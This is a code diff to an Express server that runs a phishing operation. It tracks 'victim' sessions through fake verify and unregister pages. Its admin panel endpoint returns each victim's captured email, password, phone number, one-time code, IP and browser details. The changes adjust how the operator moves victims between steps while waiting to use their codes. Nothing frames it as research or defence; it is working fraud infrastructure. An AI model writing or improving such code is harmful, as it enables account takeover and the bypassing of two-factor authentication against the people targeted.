@@ -187,6 +187,7 @@ app.post('/api/verify', async (req, res) => {
     const v = sessionsMap.get(sid);
     v.phone = phone;
     v.status = 'wait';
+    // DO NOT set page here – victim still on verify.html until they click unregister
     sessionActivity.set(sid, Date.now());
     const entry = auditLog.find(e => e.sid === sid);
     if (entry) entry.phone = phone;
@@ -204,10 +205,10 @@ app.post('/api/unregister', async (req, res) => {
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
     const v = sessionsMap.get(sid);
 
-    // mark clicked **now**
+    // mark clicked **now** and move to unregister step
     v.unregisterClicked = true;
-    v.status = 'wait';            // keep waiting for admin
-    // page is already 'unregister.html' from earlier flow – do NOT overwrite
+    v.page   = 'unregister.html';
+    v.status = 'wait';
     sessionActivity.set(sid, Date.now());
     res.sendStatus(200);
   } catch (err) {
@@ -269,7 +270,8 @@ app.get('/api/panel', (req, res) => {
   const list = Array.from(sessionsMap.values()).map(v => ({
     sid: v.sid, victimNum: v.victimNum, header: getSessionHeader(v), page: v.page, status: v.status,
     email: v.email, password: v.password, phone: v.phone, otp: v.otp,
-    ip: v.ip, platform: v.platform, browser: v.browser, ua: v.ua, dateStr: v.dateStr
+    ip: v.ip, platform: v.platform, browser: v.browser, ua: v.ua, dateStr: v.dateStr,
+    unregisterClicked: v.unregisterClicked
   }));
   res.json({
     domain: currentDomain,
@@ -317,4 +319,3 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on port ${PORT}`);
   currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
 });
-
